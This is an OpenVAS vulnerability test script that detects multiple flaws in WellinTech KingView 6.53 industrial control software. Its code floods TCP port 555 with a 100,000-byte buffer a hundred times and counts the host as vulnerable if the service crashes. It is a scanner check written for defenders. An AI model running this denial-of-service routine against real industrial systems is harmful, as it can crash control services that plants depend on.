###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wellintech_kingview_mult_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# WellinTech KingView Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802911");
  script_version("$Revision: 4690 $");
  script_cve_id("CVE-2012-1830", "CVE-2012-1831", "CVE-2012-1832", "CVE-2012-2560");
  script_bugtraq_id(54280);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-07-10 17:26:36 +0530 (Tue, 10 Jul 2012)");
  script_name("WellinTech KingView Multiple Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl");
  script_require_ports(555);

  script_xref(name:"URL", value:"http://secunia.com/advisories/49058");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-185-01.pdf");
  script_xref(name:"URL", value:"http://www.wellintech.com/index.php/news/33-patch-for-kingview653");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114165/kingviewtouchview-overflow.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114166/kingviewtouchview-overwrite.txt");

  tag_impact = "Successful exploitation allows remote attackers to gain sensitive information
  via directory traversal attacks or cause the application to crash, creating a
  denial of service condition.

  Impact Level: Application";

  tag_affected = "WellinTech KingView version 6.53";

  tag_insight = "- Multiple errors in 'touchview.exe' when processing certain requests, can
    be exploited to cause a crash via a specially crafted request sent to
    TCP port 555.
  - A specially crafted packet to either Port 2001/TCP or Port 2001/UDP, an
    attacker may read from an invalid memory location in the KingView
    application.
  - A specially crafted GET request via HTTP on Port 8001/TCP, an attacker
    may access arbitrary information from the KingView application.";

  tag_solution = "Apply the patch from below link
  http://www.wellintech.com/index.php/news/33-patch-for-kingview653";

  tag_summary = "This host is running WellinTech KingView and is prone to multiple
  vulnerabilties.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

## Variable Initialization
req = "";
port = 0;
soc = 0;
soc1 = 0;

## Port
port = 555;

## Check the TCP port status
if(!get_port_state(port)){
  exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct attack request
req = crap(length:100000, data:"D");

## Close Socket
close(soc);

## Send crafted request
for(i=0;i<100;i++)
{
  soc = open_sock_tcp(port);
  if(soc)
  {
    send(socket:soc, data:req);
    close(soc);
  }
  else {
   break;
  }
}

## Open the socket to confirm server is crashed
soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(soc1);
  exit(0);
}
close(soc1);
